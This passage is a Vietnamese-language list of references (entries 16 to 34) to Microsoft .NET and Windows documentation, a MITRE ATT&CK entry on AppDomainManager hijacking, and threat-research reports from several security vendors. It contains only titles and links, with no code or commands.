- [16] [Microsoft Learn – Phần tử `<appDomainManagerAssembly>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagerassembly-element)
- [17] [Microsoft Learn – Phần tử `<appDomainManagerType>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/appdomainmanagertype-element)
- [18] [Microsoft Learn – Phần tử `<probing>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/probing-element)
- [19] [Microsoft Learn – Phần tử `<bypassTrustedAppStrongNames>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/bypasstrustedappstrongnames-element)
- [20] [Microsoft Learn – Phần tử `<publisherPolicy>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/runtime/publisherpolicy-element)
- [21] [Microsoft Learn – Phần tử `<requiredRuntime>`](https://learn.microsoft.com/en-us/dotnet/framework/configure-apps/file-schema/startup/requiredruntime-element)
- [22] [Check Point Research – Nhanh và dữ dội: Các hoạt động của Nimbus Manticore trong xung đột Iran](https://research.checkpoint.com/2026/fast-and-furious-nimbus-manticore-operations-during-the-iranian-conflict/)
- [23] [Microsoft Learn – Tác vụ Task](https://learn.microsoft.com/en-us/windows/win32/taskschd/task-actions)
- [24] [MITRE ATT&CK – T1574.014 AppDomainManager](https://attack.mitre.org/techniques/T1574/014/)
- [25] [Unit 42 – CL-STA-1062 nhắm vào chính phủ và cơ sở hạ tầng trọng yếu ở Đông Nam Á](https://unit42.paloaltonetworks.com/cl-sta-1062-tinyrct-backdoor/)
- [26] [Elastic Security Labs – Tái dựng và phát hiện DLL Search-Order Hijacking trên Windows bằng Elastic Defend 9.5.0](https://www.elastic.co/security-labs/threat-command/dll-search-order-hijacking-elastic-defend)
- [27] [Microsoft Learn – Tạo thư viện native bằng Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/libraries)
- [28] [Microsoft Learn – Native exports với Native AOT](https://learn.microsoft.com/en-us/dotnet/core/deploying/native-aot/interop#native-exports)
- [29] [Microsoft Learn – ModuleInitializerAttribute](https://learn.microsoft.com/en-us/dotnet/api/system.runtime.compilerservices.moduleinitializerattribute?view=net-7.0)
- [30] [Microsoft Learn – Thứ tự tìm kiếm dynamic-link library](https://learn.microsoft.com/en-us/windows/win32/dlls/dynamic-link-library-search-order)
- [31] [Microsoft Learn – Định dạng PE](https://learn.microsoft.com/en-us/windows/win32/debug/pe-format)
- [32] [FortiGuard Labs – Phát hiện biến thể SectopRAT được nhúng trong phần mềm hợp pháp](https://www.fortinet.com/blog/threat-research/uncovering-a-sectoprat-variant-embedded-in-legitimate-software)
- [33] [Mandiant – Đánh cắp LIGHTSHOW (Phần Một)](https://cloud.google.com/blog/topics/threat-intelligence/lightshow-north-korea-unc2970/)
- [34] [Kaspersky Securelist – Chiến dịch FlashHole](https://securelist.com/lazarus-operation-flashhole/121541/)
